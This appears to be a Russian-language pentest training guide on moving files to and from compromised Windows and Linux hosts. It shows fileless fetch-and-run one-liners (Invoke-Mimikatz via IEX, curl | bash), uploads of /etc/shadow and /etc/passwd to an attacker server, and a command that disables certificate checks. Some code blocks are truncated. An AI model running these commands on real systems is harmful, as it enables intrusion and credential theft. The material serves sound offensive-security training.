### 1. Введение в передачу файлов (File Transfers)

Передача файлов – это **фундаментальная задача** в компьютерных системах, которая часто необходима в различных сценариях, например, при проведении оценки безопасности системы.

**Почему это важно?**

- В процессе пентеста или оценки безопасности часто возникает необходимость **перемещать файлы на целевую систему или из нее**. Например, вам может потребоваться загрузить инструмент для эскалации привилегий или выгрузить данные для анализа.
- Понимание различных методов передачи файлов и принципов работы сетей **помогает достигать целей** во время оценки.
- **И для атакующих, и для защитников** важно знать эти методы: атакующие используют их для обхода защит и проведения операций, а защитники — для мониторинга и создания соответствующих политик безопасности.

**С какими трудностями можно столкнуться?**

- **Хост-контроли:** Могут предотвращать ваши действия, например, политики контроля приложений (application whitelisting) могут блокировать PowerShell, или антивирусное/EDR-программное обеспечение может блокировать определенные приложения или действия.
- **Сетевые устройства:** Брандмауэры (Firewalls), системы обнаружения вторжений (IDS) или системы предотвращения вторжений (IPS) могут мониторить или блокировать определенные порты или необычные операции. Например, в одном сценарии брандмауэр блокировал исходящий трафик по порту 21 (FTP), а веб-фильтрация не позволяла получить доступ к GitHub.

**Важность разнообразных техник:**

- Несмотря на то, что существует множество инструментов для передачи файлов, многие из них могут быть заблокированы или отслеживаться администраторами. Поэтому **важно знать широкий спектр техник**, которые могут быть доступны в конкретной среде. Этот модуль предназначен для изучения техник, использующих **инструменты и приложения, обычно доступные** в Windows и Linux.

**Пример из реального мира (Атака Astaroth):**

- **"Бесфайловые" угрозы** (fileless threats) используют легитимные встроенные в систему инструменты для выполнения атаки, при этом файл может не "присутствовать" на диске, а выполняться в памяти.
- Атака Astaroth включала несколько этапов передачи файлов:
    1. Злонамеренная ссылка в фишинговом письме вела к LNK-файлу.
    2. LNK-файл запускал инструмент **WMIC** с параметром `/Format` для загрузки и выполнения вредоносного JavaScript-кода.
    3. JavaScript-код загружал полезные нагрузки, используя инструмент **Bitsadmin**.
    4. Все полезные нагрузки были закодированы в Base64 и декодированы с помощью инструмента **Certutil**, в результате чего были получены DLL-файлы.
    5. Инструмент **regsvr32** использовался для загрузки одной из декодированных DLL, которая расшифровывала и загружала другие файлы, пока финальная полезная нагрузка Astaroth не была внедрена в процесс `Userinit`.
- Это отличный пример того, как злоумышленники используют **множество методов передачи файлов для обхода защиты**.

### 2. Методы передачи файлов в Windows

Операционная система Windows постоянно развивается, и новые версии включают различные утилиты для операций передачи файлов.

#### 2.1. Операции загрузки (Download Operations)

Предположим, у нас есть доступ к машине `MS02`, и нам нужно загрузить файл с нашей машины Pwnbox.

##### 2.1.1. Кодирование и декодирование Base64 с помощью PowerShell

- **Что это:** Метод, который **не требует сетевой связи** (по крайней мере, для самого файла). Если у вас есть доступ к терминалу, вы можете закодировать файл в строку Base64, скопировать ее содержимое из терминала и затем выполнить обратную операцию – декодирование файла на целевой машине.
- **Когда полезно:** Подходит для **небольших файлов**, так как команды могут быть ограничены по длине строки.
- **Как это работает:** Файл преобразуется в текстовую строку, которую можно скопировать и вставить, минуя ограничения на сетевые протоколы.
- **Проверка:** Важным шагом является проверка целостности файла с помощью MD5-хэша. `md5sum` (в Linux) и `Get-FileHash` (в PowerShell) используются для этой цели.

**Как это сделать (пример):**

1. **На Pwnbox (Linux):**
    - Проверьте MD5-хэш исходного файла (например, `id_rsa`):
        
        ```
        md5sum id_rsa
        # Вывод: 4e301756a07ded0a2dd6953abf015278  id_rsa
        ```
        
    - Закодируйте файл в Base64 (используйте `-w 0` для одной строки, `echo` для новой строки для удобства копирования):
        
        ```
        cat id_rsa | base64 -w 0;echo
        # Вывод: Длинная строка Base64
        ```
        
2. **На целевой машине Windows (PowerShell):**
    - Скопируйте полученную Base64 строку и вставьте ее в терминал PowerShell.
    - Используйте PowerShell для декодирования и сохранения файла:
        
        ```
        [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("ВАША_ДЛИННАЯ_BASE64_СТРОКА"))
        ```
        
    - Подтвердите успешность передачи, проверив MD5-хэш:
        
        ```
        Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
        # Вывод: MD5             4E301756A07DED0A2DD6953ABF015278
        ```
        

- **Ограничения:** Утилита командной строки Windows (`cmd.exe`) имеет **максимальную длину строки в 8191 символ**. Веб-оболочка может выдать ошибку при попытке отправить очень большие строки.

##### 2.1.2. Загрузка файлов с помощью PowerShell Web Downloads

- **Почему удобно:** Большинство компаний разрешают **исходящий HTTP и HTTPS трафик** через брандмауэр для обеспечения продуктивности сотрудников. Это делает такие методы передачи файлов очень удобными.
- **Защита:** Защитники могут использовать решения для веб-фильтрации для предотвращения доступа к определенным категориям веб-сайтов, блокировки загрузки определенных типов файлов (например, .exe) или разрешения доступа только к списку разрешенных доменов в более ограниченных сетях.
- **Как это работает:** PowerShell предлагает множество опций для передачи файлов. Класс `System.Net.WebClient` может использоваться для загрузки файла по HTTP, HTTPS или FTP.

**Методы класса `System.Net.WebClient` для загрузки данных:**

- `OpenRead`: Возвращает данные из ресурса в виде потока (Stream).
- `OpenReadAsync`: Возвращает данные из ресурса, не блокируя вызывающий поток.
- `DownloadData`: Загружает данные из ресурса и возвращает массив байтов.
- `DownloadDataAsync`: Загружает данные из ресурса и возвращает массив байтов, не блокируя вызывающий поток.
- `DownloadFile`: **Загружает данные из ресурса в локальный файл**.
- `DownloadFileAsync`: Загружает данные из ресурса в локальный файл, не блокируя вызывающий поток.
- `DownloadString`: Загружает строку из ресурса и возвращает строку.
- `DownloadStringAsync`: Загружает строку из ресурса, не блокируя вызывающий поток.

**Примеры использования:**

1. **Метод `DownloadFile` (сохраняет на диск):**
    
    ```
    (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
    ```
    
    - Также есть асинхронная версия:
        
        ```
        (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
        ```
        
2. **`DownloadString` - "Бесфайловый" метод (Fileless Method):**
    - Вместо загрузки PowerShell-скрипта на диск, вы можете **запустить его прямо в памяти** с помощью командлета `Invoke-Expression` (или псевдонима `IEX`).
    - Пример выполнения скрипта PowerView.ps1 напрямую в памяти:
        
        ```
        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
        ```
        
    - `IEX` также принимает входные данные из конвейера:
        
        ```
        (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
        ```
        
3. **`Invoke-WebRequest`:**
    - Доступен с PowerShell 3.0 и выше.
    - **Заметно медленнее** при загрузке файлов.
    - Имеет псевдонимы `iwr`, `curl`, и `wget`.
    - Пример:
        
        ```
        Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
        ```
        
        - Можно также выполнить "бесфайлово":
            
            ```
            Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
            ```
            

- **Частые ошибки с PowerShell при загрузках:**
    - **Ошибка первой настройки Internet Explorer:** Если конфигурация первого запуска Internet Explorer не завершена, загрузка может быть предотвращена.
        - **Обход:** Используйте параметр `-UseBasicParsing`.
            
            ```
            Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
            ```
            
    - **Ошибка доверия к SSL/TLS-сертификату:** Если сертификат не является доверенным.
        - **Обход:** Добавьте команду, которая временно отключает проверку сертификатов:
            
            ```
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
            ```
            

##### 2.1.3. Загрузка через SMB (Server Message Block)

- **Что это:** Протокол Server Message Block (SMB), работающий на порту TCP/445, распространен в корпоративных сетях Windows. Он позволяет приложениям и пользователям передавать файлы на удаленные серверы и с них.
- **Как это работает:** Мы можем легко загружать файлы с нашей Pwnbox, создав SMB-сервер с помощью `smbserver.py` из Impacket и затем используя встроенные команды Windows, такие как `copy`, `move`, или PowerShell `Copy-Item`.

**Как это сделать:**

1. **Создайте SMB-сервер на Pwnbox:**
    - Обычный (без аутентификации, может быть заблокирован новыми версиями Windows):
        
        ```
        sudo impacket-smbserver share -smb2support /tmp/smbshare
        ```
        
    - С именем пользователя и паролем (для обхода блокировки неаутентифицированного гостевого доступа в новых версиях Windows):
        
        ```
        sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
        ```
        
2. **Скопируйте файл с SMB-сервера на целевой машине Windows:**
    - Если гостевой доступ разрешен:
        
        ```
        copy \\192.168.220.133\share\nc.exe
        ```
        
    - Если гостевой доступ заблокирован (и вы используете пользователя/пароль):
        - **Смонтируйте SMB-сервер:**
            
            ```
            net use n: \\192.168.220.133\share /user:test test
            ```
            
        - **Затем скопируйте файл:**
            
            ```
            copy n:\nc.exe
            ```
            

- **Примечание:** Вы также можете смонтировать SMB-сервер, если получаете ошибку при использовании `copy filename \\IP\sharename`.

##### 2.1.4. Загрузка через FTP (File Transfer Protocol)

- **Что это:** Еще один способ передачи файлов, использующий порты TCP/21 (управление) и TCP/20 (данные).
- **Как это работает:** Вы можете использовать встроенный FTP-клиент Windows или PowerShell `Net.WebClient` для загрузки файлов с FTP-сервера.

**Как это сделать:**

1. **Настройте FTP-сервер на Pwnbox:**
    - Установите модуль Python3 `pyftpdlib`:
        
        ```
        sudo pip3 install pyftpdlib
        ```
        
    - Запустите FTP-сервер (по умолчанию `pyftpdlib` использует порт 2121, здесь указан порт 21, а анонимная аутентификация включена по умолчанию):
        
        ```
        sudo python3 -m pyftpdlib --port 21
        ```
        
2. **Передача файлов с FTP-сервера на целевой машине Windows:**
    - **С помощью PowerShell:**
        
        ```
        (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
        ```
        
    - **С помощью FTP-клиента и файла команд (для неинтерактивной оболочки):**
        - Создайте файл `ftpcommand.txt` с командами:
            
            ```
            echo open 192.168.49.128 > ftpcommand.txt
            echo USER anonymous >> ftpcommand.txt
            echo binary >> ftpcommand.txt
            echo GET file.txt >> ftpcommand.txt
            echo bye >> ftpcommand.txt
            ```
            
        - Выполните FTP-клиент, используя этот файл:
            
            ```
            ftp -v -n -s:ftpcommand.txt
            ```
            

#### 2.2. Операции загрузки (Upload Operations)

Существуют также ситуации, когда необходимо загрузить файлы с целевой машины на вашу атакующую машину, например, для анализа, эксфильтрации или взлома паролей. Вы можете использовать те же методы, что и для загрузки, но в обратном направлении.

##### 2.2.1. Кодирование и декодирование Base64 с помощью PowerShell

- **Как это работает:** Аналогично загрузке, файл кодируется в Base64 на целевой машине, его содержимое копируется, а затем декодируется на вашей атакующей машине.

**Как это сделать:**

1. **На целевой машине Windows (PowerShell):**
    - Закодируйте файл (например, `hosts`):
        
        ```
        ::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
        # Вывод: Длинная строка Base64
        ```
        
    - Получите MD5-хэш исходного файла для проверки:
        
        ```
        Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
        # Вывод: Hash: 3688374325B992DEF12793500307566D
        ```
        
2. **На атакующей машине (Linux):**
    - Скопируйте Base64-строку и декодируйте ее:
        
        ```
        echo 'ВАША_ДЛИННАЯ_BASE64_СТРОКА' | base64 -d > hosts
        ```
        
    - Подтвердите успешность передачи, проверив MD5-хэш:
        
        ```
        md5sum hosts
        # Вывод: 3688374325b992def12793500307566d  hosts
        ```
        

##### 2.2.2. Загрузка через PowerShell Web Uploads

- **Что это:** PowerShell не имеет встроенной функции для загрузки файлов, но вы можете использовать `Invoke-WebRequest` или `Invoke-RestMethod` для создания собственной функции загрузки. Вам также потребуется веб-сервер, который принимает загрузки, что не является стандартной опцией в большинстве обычных веб-серверных утилит.
- **Сервер для загрузки:** Рекомендуется `uploadserver`, расширенный модуль Python `HTTP.server`, который включает страницу загрузки файлов.

**Как это сделать:**

1. **На атакующей машине (Pwnbox):**
    - Установите `uploadserver`:
        
        ```
        pip3 install uploadserver
        ```
        
    - Запустите веб-сервер:
        
        ```
        python3 -m uploadserver
        # Вывод: File upload available at /upload, Serving HTTP on 0.0.0.0 port 8000
        ```
        
2. **На целевой машине Windows (PowerShell):**
    - Загрузите и используйте скрипт `PSUpload.ps1`, который использует `Invoke-RestMethod` для выполнения операций загрузки. Скрипт принимает два параметра: `-File` (путь к файлу) и `-Uri` (URL сервера).
        
        ```
        IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
        Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
        # Вывод: [+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
        ```
        

##### 2.2.3. Загрузка через PowerShell Base64 Web Upload

- **Что это:** Еще один способ использовать PowerShell и Base64-кодированные файлы для загрузки — это комбинация `Invoke-WebRequest` или `Invoke-RestMethod` с `Netcat`.
- **Как это работает:** Вы используете Netcat для прослушивания указанного порта и отправляете файл в виде POST-запроса. Затем вы копируете вывод Netcat и используете функцию декодирования Base64 для преобразования строки обратно в файл.

**Как это сделать:**

1. **На атакующей машине (Pwnbox):**
    - Запустите Netcat для прослушивания порта 8000:
        
        ```
        nc -lvnp 8000
        # Вывод: listening on [any] 8000 ...
        ```
        
2. **На целевой машине Windows (PowerShell):**
    - Закодируйте файл в Base64:
        
        ```
        $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
        ```
        
    - Отправьте Base64-строку как тело POST-запроса на Netcat-сервер:
        
        ```
        Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
        ```
        
3. **На атакующей машине (Pwnbox):**
    - Netcat получит HTTP-запрос с Base64-данными.
    - Скопируйте Base64-строку из вывода Netcat и декодируйте ее:
        
        ```
        echo <base64> | base64 -d -w 0 > hosts
        ```
        

##### 2.2.4. Загрузка через SMB (Server Message Block)

- **Ограничения:** Обычно корпорации не разрешают протокол SMB (TCP/445) из своей внутренней сети во внешнюю из-за потенциальных атак.
- **Альтернатива: WebDAV:** Расширение HTTP (RFC 4918), которое позволяет веб-серверу работать как файловый сервер, поддерживая совместное создание контента. WebDAV также может использовать HTTPS.
- **Как работает WebDAV:** Когда вы пытаетесь использовать SMB, Windows сначала попытается подключиться по протоколу SMB, и если SMB-ресурс недоступен, он попытается подключиться через HTTP.

**Как это сделать (с WebDAV):**

1. **Настройте WebDAV-сервер на атакующей машине (Pwnbox):**
    - Установите необходимые модули Python:
        
        ```
        sudo pip3 install wsgidav cheroot
        ```
        
    - Запустите WebDAV-сервер (например, на порту 80, с корневым каталогом `/tmp` и анонимным доступом):
        
        ```
        sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
        # Важно: В выводе будет указано "Share '/' will allow anonymous write access."
        ```
        
2. **Подключитесь к WebDAV-ресурсу с целевой машины Windows:**
    - **Используя ключевое слово `DavWWWRoot`:** Это специальное ключевое слово, распознаваемое оболочкой Windows, которое указывает драйверу Mini-Redirector, что вы подключаетесь к корню WebDAV-сервера.
        
        ```
        dir \\192.168.49.128\DavWWWRoot
        ```
        
    - **Указав существующую папку:** Вы можете избежать использования `DavWWWRoot`, если укажете существующую папку на вашем сервере.
        
        ```
        dir \\192.168.49.128\sharefolder
        ```
        
3. **Загрузите файлы на WebDAV-сервер:**
    
    ```
    copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
    # Или, если указали папку:
    copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
    ```
    

- **Примечание:** Если нет ограничений SMB (TCP/445), вы можете использовать `impacket-smbserver` для операций загрузки таким же образом, как и для загрузки.

##### 2.2.5. Загрузка через FTP (File Transfer Protocol)

- **Как это работает:** Процесс загрузки файлов с использованием FTP очень похож на загрузку.

**Как это сделать:**

1. **Запустите FTP-сервер на атакующей машине (Pwnbox):**
    - Обязательно укажите опцию `--write`, чтобы разрешить клиентам загружать файлы:
        
        ```
        sudo python3 -m pyftpdlib --port 21 --write
        # Будет предупреждение: "write permissions assigned to anonymous user."
        ```
        
2. **Загрузка файла с целевой машины Windows:**
    - **С помощью PowerShell:**
        
        ```
        (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
        ```
        
    - **С помощью FTP-клиента и файла команд:**
        - Создайте файл `ftpcommand.txt` с командами:
            
            ```
            echo open 192.168.49.128 > ftpcommand.txt
            echo USER anonymous >> ftpcommand.txt
            echo binary >> ftpcommand.txt
            echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
            echo bye >> ftpcommand.txt
            ```
            
        - Выполните FTP-клиент:
            
            ```
            ftp -v -n -s:ftpcommand.txt
            ```

### 3. Методы передачи файлов в Linux

Linux - универсальная операционная система, которая обычно имеет множество различных инструментов для передачи файлов. Хотя Linux может обмениваться данными через FTP и SMB, как и Windows, большинство вредоносных программ на всех операционных системах используют **HTTP и HTTPS для связи**.

#### 3.1. Операции загрузки (Download Operations)

Предположим, у нас есть доступ к машине `NIX04`, и нам нужно загрузить файл с нашей машины Pwnbox.

##### 3.1.1. Кодирование/Декодирование Base64

- **Что это:** Метод, который **не требует сетевой связи** для самого файла. Файл кодируется в Base64, его содержимое копируется из терминала, а затем выполняется обратная операция декодирования на целевой машине.
- **Когда полезно:** Подходит для небольших файлов.

**Как это сделать (пример):**

1. **На Pwnbox (Linux):**
    - Проверьте MD5-хэш исходного файла:
        
        ```
        md5sum id_rsa
        ```
        
    - Закодируйте файл в Base64 (`-w 0` для одной строки, `;echo` для новой строки):
        
        ```
        cat id_rsa | base64 -w 0;echo
        # Вывод: Длинная строка Base64
        ```
        
2. **На целевой машине Linux:**
    - Скопируйте Base64-строку и вставьте ее в терминал.
    - Декодируйте файл (`-d` для декодирования):
        
        ```
        echo -n 'ВАША_ДЛИННАЯ_BASE64_СТРОКА' | base64 -d > id_rsa
        ```
        
    - Подтвердите MD5-хэш:
        
        ```
        md5sum id_rsa
        # Вывод: 4e301756a07ded0a2dd6953abf015278  id_rsa
        ```
        

- **Примечание:** Вы также можете загружать файлы, используя обратную операцию: закодируйте файл на скомпрометированной машине и декодируйте его на Pwnbox.

##### 3.1.2. Загрузка через Web с помощью Wget и cURL

- **Что это:** `wget` и `curl` — это две наиболее распространенные утилиты в дистрибутивах Linux для взаимодействия с веб-приложениями, часто предустановленные.

**Как это сделать:**

1. **Загрузка файла с помощью `wget`:**
    
    - Вам нужно указать URL и опцию `-O` для установки имени выходного файла.
    
    ```
    wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
    ```
    
2. **Загрузка файла с помощью `cURL`:**
    
    - Очень похож на `wget`, но опция выходного файла — строчная `-o`.
    
    ```
    curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
    ```
    

##### 3.1.3. "Бесфайловые" атаки (Fileless Attacks) с использованием Linux

- **Что это:** Благодаря принципам работы Linux и конвейеров (pipes), большинство инструментов в Linux могут быть использованы для выполнения "бесфайловых" операций, что означает, что вам **не нужно загружать файл на диск для его выполнения**.
- **Примечание:** Некоторые полезные нагрузки (например, `mkfifo`) записывают файлы на диск. Имейте в виду, что хотя выполнение полезной нагрузки может быть "бесфайловым" при использовании конвейера, в зависимости от выбранной полезной нагрузки могут создаваться временные файлы в ОС.

**Как это сделать:**

1. **"Бесфайловая" загрузка с помощью `cURL`:**
    - Запустите скрипт `LinEnum.sh` напрямую, не сохраняя его на диск:
        
        ```
        curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
        ```
        
2. **"Бесфайловая" загрузка с помощью `wget`:**
    - Загрузите Python-скрипт и передайте его напрямую в бинарник Python:
        
        ```
        wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
        ```
        

##### 3.1.4. Загрузка с помощью Bash (`/dev/tcp`)

- **Когда полезно:** Если ни один из известных инструментов передачи файлов недоступен.
- **Требования:** Версия Bash 2.04 или выше, скомпилированная с `--enable-net-redirections`.
- **Как это работает:** Встроенный файл устройства `/dev/TCP` может быть использован для простых загрузок файлов. Запись в этот файл заставляет Bash открыть TCP-соединение с `хост:порт`.

**Как это сделать (HTTP GET запрос):**

1. Откройте TCP-соединение:
    
    ```
    exec 3<>/dev/tcp/10.10.10.32/80
    ```
    
2. Отправьте HTTP GET запрос:
    
    ```
    echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
    ```
    
3. Выведите ответ на экран:
    
    ```
    cat <&3
    ```
    

##### 3.1.5. Загрузка через SSH (Secure Shell)

- **Что это:** SSH - протокол для безопасного доступа к удаленным компьютерам. Он включает утилиту `SCP` (secure copy) для удаленной передачи файлов, которая по умолчанию использует протокол SSH.
- **Как это работает:** `SCP` похож на команды `copy` или `cp`, но вместо локального пути вам нужно указать имя пользователя, удаленный IP-адрес или DNS-имя, а также учетные данные пользователя.

**Как это сделать:**

1. **Включите и запустите SSH-сервер на Pwnbox:**
    
    ```
    sudo systemctl enable ssh
    sudo systemctl start ssh
    ```
    
    - Убедитесь, что SSH-сервер слушает порт 22:
        
        ```
        netstat -lnpt
        # Должен быть вывод типа: tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN -
        ```
        
2. **Загрузите файл с целевой машины Linux на Pwnbox с помощью `SCP`:**
    
    ```
    scp [email protected]:/root/myroot.txt .
    # Вам будет предложено ввести пароль пользователя
    ```
    

- **Примечание:** Вы можете создать временную учетную запись пользователя для передачи файлов, чтобы избежать использования основных учетных данных на удаленном компьютере.

#### 3.2. Операции загрузки (Upload Operations)

Методы, используемые для загрузки, также применимы для загрузки файлов с целевой машины на атакующий хост.

##### 3.2.1. Веб-загрузка (Web Upload)

- **Что это:** Вы можете использовать `uploadserver` (модуль Python `HTTP.Server`) для создания веб-сервера, который принимает загрузки.
- **Безопасная связь (HTTPS):** Рекомендуется настроить `uploadserver` для использования HTTPS.

**Как это сделать:**

1. **На Pwnbox (атакующая машина):**
    - Установите `uploadserver`:
        
        ```
        sudo python3 -m pip install --user uploadserver
        ```
        
    - **Создайте самоподписанный сертификат** (для HTTPS):
        
        ```
        openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
        ```
        
    - Создайте каталог для размещения веб-сервера и запустите `uploadserver` с сертификатом:
        
        ```
        mkdir https && cd https
        sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
        # Вывод: File upload available at /upload, Serving HTTPS on 0.0.0.0 port 443
        ```
        
2. **На скомпрометированной машине Linux:**
    - Загрузите файлы (например, `/etc/passwd` и `/etc/shadow`) с помощью `cURL` (используйте `--insecure`, так как сертификат самоподписан):
        
        ```
        curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
        ```
        

##### 3.2.2. Альтернативный метод веб-передачи файлов (Alternative Web File Transfer Method)

- **Что это:** Если на скомпрометированной машине Linux нет установленного веб-сервера, вы можете быстро запустить **мини-веб-сервер**, используя Python, PHP или Ruby.
- **Преимущества:** Гибкость в изменении корневого каталога и портов.
- **Примечание:** Важно учитывать, что входящий трафик может быть заблокирован. Этот метод позволяет "скачивать" файлы с целевой машины на Pwnbox, а не "загружать" их.

**Как это сделать (запуск мини-веб-сервера на целевой машине Linux):**

- **С помощью Python3:**
    
    ```
    python3 -m http.server
    # Serving HTTP on 0.0.0.0 port 8000
    ```
    
- **С помощью Python2.7:**
    
    ```
    python2.7 -m SimpleHTTPServer
    # Serving HTTP on 0.0.0.0 port 8000
    ```
    
- **С помощью PHP:**
    
    ```
    php -S 0.0.0.0:8000
    # PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
    ```
    
- **С помощью Ruby:**
    
    ```
    ruby -run -ehttpd . -p8000
    # WEBrick::HTTPServer#start: pid=1705 port=8000
    ```
    

**Загрузка файла с целевой машины на Pwnbox:**

- После запуска веб-сервера на целевой машине, вы можете загрузить файл с Pwnbox:
    
    ```
    wget 192.168.49.128:8000/filetotransfer.txt
    ```
    

##### 3.2.3. Загрузка через SCP

- **Что это:** Если компании разрешают исходящие SSH-соединения (TCP/22), вы можете использовать SSH-сервер с утилитой `scp` для загрузки файлов.

**Как это сделать:**

1. **На Pwnbox (убедитесь, что SSH-сервер запущен).**
2. **Загрузите файл с целевой машины Linux на Pwnbox с помощью `SCP`:**
    
    ```

    # Вам будет предложено ввести пароль
    ```
    

- **Примечание:** Синтаксис `scp` похож на `cp` или `copy`.

### 4. Передача файлов с помощью кода (Transferring Files with Code)

На целевых машинах часто можно найти установленные различные языки программирования, такие как Python, PHP, Perl и Ruby, особенно в дистрибутивах Linux. В Windows это менее распространено, но возможно. Также Windows имеет встроенные приложения, такие как `cscript` и `mshta`, для выполнения JavaScript или VBScript.

#### 4.1. Python

- **Что это:** Популярный язык программирования. Поддерживает выполнение однострочных команд из командной строки с помощью опции `-c`.

**Как это сделать (загрузка файла):**

- **Python 2:**
    
    ```
    python2.7 -c 'import urllib;urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
    ```
    
- **Python 3:**
    
    ```
    python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
    ```
    

#### 4.2. PHP

- **Что это:** Очень распространен, особенно для веб-сервисов. Предоставляет множество методов передачи файлов и может выполнять однострочные команды с помощью опции `-r`.

**Как это сделать (загрузка файла):**

- **Загрузка с помощью `file_get_contents()` и `file_put_contents()`:**
    
    ```
    php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
    ```
    
- **Загрузка с помощью `fopen()`:** Альтернатива, которая позволяет открыть URL, прочитать его содержимое и сохранить в файл.
    
    ```
    php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
    ```
    
- **Загрузка файла и передача его в Bash (файл без сохранения на диск):**
    
    ```
    php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
    ```
    

#### 4.3. Другие языки (Ruby, Perl)

- **Что это:** Также популярные языки, поддерживающие выполнение однострочных команд с опцией `-e`.

**Как это сделать (загрузка файла):**

- **Ruby:**
    
    ```
    ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
    ```
    
- **Perl:**
    
    ```
    perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
    ```
    

#### 4.4. JavaScript

- **Что это:** Язык сценариев, позволяющий реализовывать сложные функции на веб-страницах, также может использоваться для загрузки файлов.

**Как это сделать (загрузка файла на Windows):**

1. **Создайте файл `wget.js` со следующим содержимым:**
    
    ```
    var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
    WinHttpReq.Send();

2. **Выполните JavaScript-код из командной строки Windows или PowerShell:**
    
    ```
    cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
    ```
    

#### 4.5. VBScript

- **Что это:** Язык Active Scripting от Microsoft, предустановлен в каждой настольной версии Windows с Windows 98.

**Как это сделать (загрузка файла на Windows):**

1. **Создайте файл `wget.vbs` со следующим содержимым:**
    
    ```

2. **Выполните VBScript-код из командной строки Windows или PowerShell:**

#### 4.6. Операции загрузки (Upload Operations) с использованием Python3

- **Что это:** Модуль Python3 `requests` позволяет отправлять HTTP-запросы (GET, POST, PUT и т. д.). Его можно использовать для загрузки файла на ваш `uploadserver`.

**Как это сделать:**

1. **Запустите Python `uploadserver` на атакующей машине (Pwnbox).**
2. **Загрузите файл с помощью однострочной команды Python на целевой машине:**
    
    ```
    python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
    ```
    

- **Разбивка однострочной команды:**
    - `import requests;`: Импортирует модуль `requests`.
    - `URL = "http://192.168.49.128:8000/upload"`: Определяет целевой URL.
    - `file = open("/etc/passwd","rb")`: Определяет файл для чтения и открывает его в двоичном режиме.
    - `r = requests.post(url,files={"files":file})`: Использует POST-запрос `requests` для загрузки файла.

### 5. Различные методы передачи файлов (Miscellaneous File Transfer Methods)

Помимо уже рассмотренных методов, существуют и другие альтернативные способы и приложения для передачи файлов.

#### 5.1. Netcat и Ncat

- **Что это:** `Netcat` (сокращенно `nc`) — это утилита для работы с сетевыми соединениями через TCP или UDP, подходящая для передачи файлов. Оригинальный `Netcat` не поддерживается с 1995 года, но `Nmap Project` создал `Ncat` — современную реализацию с поддержкой SSL, IPv6, SOCKS, HTTP-прокси и других функций.
- **Использование:** На PwnBox `Ncat` доступен как `nc`, `ncat` и `netcat`.
- **Гибкость:** Либо целевая, либо атакующая машина может инициировать соединение, что полезно, если брандмауэр блокирует входящие соединения на целевой системе.

